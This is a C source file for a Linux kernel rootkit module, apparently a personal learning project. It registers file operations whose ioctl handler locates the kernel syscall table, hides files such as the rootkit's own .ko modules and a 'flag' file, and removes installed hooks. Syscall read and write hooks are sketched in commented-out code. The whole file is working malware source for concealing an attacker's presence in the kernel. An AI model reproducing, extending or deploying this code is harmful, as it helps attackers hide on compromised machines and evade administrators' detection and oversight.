#define _GNU_SOURCE
#include <linux/uaccess.h>
#include <linux/init_task.h>
#include <linux/kstrtox.h>
#include <linux/sched.h>
#include <linux/pid.h>
#include "rootkitops.h"
#include "helper.h"
#include "hidden.h"


// static void hook_read(struct pt_regs *regs){
//     printk(KERN_INFO "[peiwithhao rootkit] read hooker\n\n");
// }
//
// static void hook_write(struct pt_regs *regs){
//     printk(KERN_INFO "[peiwithhao rootkit] write hooker\n\n");
// }




ssize_t pwh_rootkit_read(struct file *file, char __user *buf, size_t count, loff_t * ppos){
    //arbitrary_remap_write((void *)(syscall_table_addr), "peiwithhao", 10);
    return 0;
}
ssize_t pwh_rootkit_write(struct file *file, const char __user *buf, size_t count, loff_t *ppos){
    return 0;
}

// struct hook_context write_hook_ctx;
// struct hook_context read_hook_ctx;
long pwh_rootkit_ioctl(struct file *file, unsigned int cmd, unsigned long arg){
    // size_t hooked_addr;
    // struct hook_context *read_hook_ctx = NULL;
    // struct hook_context *write_hook_ctx = NULL;   
    int ret; 
    switch(cmd){
        case USER_KALLSYMS:
            ret = copy_from_user(syscall_table_data, (void *)arg, sizeof(syscall_table_data));
            break;
        case SEARCH_SYSCALL:
                /* 寻找系统调用表 */
            sys_call_table_finder();
            break;
        case SUPER_HOOK:
                /* 寻找系统调用表 */
            sys_call_table_finder();
            file_hidden("flag");
            file_hidden("pwhkit.ko");
            file_hidden("pwhrootkit.ko");
            file_hidden("use_pipe");
            file_hidden("test");
            file_hidden("sys_table_finder");
            file_hidden("use");

            // hooked_addr = ((size_t *)syscall_table_addr)[217];
            // //orig_modifier(hooked_addr, (size_t)&funny_joke);
            // read_hook_ctx = hook_ctx_init();
            // if(!read_hook_ctx){
            //     printk(KERN_INFO "[peiwithhao rootkit] get context failed...");
            //     return 0;
            // }
            // write_hook_ctx = hook_ctx_init();
            // if(!write_hook_ctx){
            //     printk(KERN_INFO "[peiwithhao rootkit] get context failed...");
            //     return 0;
            // }
            // hookpoint_add(write_hook_ctx, (size_t)((size_t *)syscall_table_addr)[0], (size_t)&hook_read, 0);
            // hookpoint_add(read_hook_ctx, (size_t)((size_t *)syscall_table_addr)[1], (size_t)&hook_write, 0);
            break;
        case HOOK_RELEASE:
            hookpoint_del_all();
        default:
            break;
    }
    return 0;
}
/* 打开类容 */
int pwh_rootkit_open(struct inode *inode, struct file *file){
    return 0;
}
int pwh_rootkit_release(struct inode *inode, struct file *file){
    return 0;
}
